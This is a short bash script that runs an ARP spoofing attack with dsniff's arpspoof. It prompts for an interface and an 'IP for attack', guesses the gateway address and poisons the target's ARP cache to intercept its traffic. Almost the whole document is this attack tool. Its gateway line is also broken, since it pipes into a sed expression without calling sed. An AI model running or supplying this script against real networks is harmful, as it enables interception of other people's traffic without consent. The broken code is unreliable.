#!/bin/bash

check_command() {
    if ! command -v $1 &> /dev/null ; then
        echo "Error: $1 not found" 
        exit 1
    fi
}

check_command "dsniff"

read -p "Insert your network interface: " interface
read -p "Insert IP for attack: " ip
gateway=$(echo $ip | 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interface" -t "$ip" "$gateway"

